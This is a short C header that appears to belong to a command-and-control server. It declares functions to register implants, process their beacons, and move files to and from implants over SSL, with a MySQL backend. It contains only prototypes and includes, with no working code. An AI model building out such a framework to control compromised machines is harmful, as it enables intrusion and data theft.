#ifndef IMPLANT_HANDLER
#define IMPLANT_HANDLER

#include <openssl/evp.h>
#include <openssl/x509v3.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/sslerr.h>
#include <openssl/sha.h>   
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <time.h>
#include <pthread.h>

#include "common.h"
#include "./cJSON/cJSON.h"


char * GenerateID(cJSON *json);

void register_implant(MYSQL* con, cJSON *json, char *ip);

char *beacon_implant(MYSQL* con, cJSON *json, char* ip);

void *implant_handler(void *arg);


// only works for ssl
int upload_to_implant(SSL *ssl, char *filename);
int download_from_implant(SSL *ssl);


#endif